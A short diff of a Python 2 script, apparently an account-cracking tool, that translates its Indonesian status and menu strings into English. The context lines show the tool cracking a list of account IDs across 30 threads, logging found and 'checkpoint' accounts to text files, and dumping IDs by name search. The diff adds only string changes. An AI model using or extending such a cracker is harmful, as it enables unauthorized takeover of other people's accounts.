@@ -20,7 +20,7 @@ class crack:
 		if len(self.pw) ==0:
 			self.pwlist()
 		else:
-			print "!: Sedang di Crack..."
+			print "!: crack started..."
 			print "+: account found saved to: multiresult.txt"
 			print "+: account checkpoint saved to: checkpoint.txt"
 			ThreadPool(30).map(self.main,self.fl)
@@ -40,7 +40,7 @@ class crack:
 					self.cp.append("%s|%s"%(fl,i))
 					open("checkpoint.txt","a+").write("%s|%s\n"%(fl,i))
 			self.ko+=1
-			print "\r[Crack] %s/%s - Dapat-:%s - CP-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+			print "\r[Crack] %s/%s - found-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
 		except:
 			self.main(fl)
 			
@@ -82,7 +82,7 @@ def dumpfl():
 
 
 while True:
-	print "[1] Dump ID Lewat Nama"
+	print "[1] Dump id By Search Name"
 	print "[2] Crack\n"
 	r=raw_input("?: pilih: ")
 	if r=="":
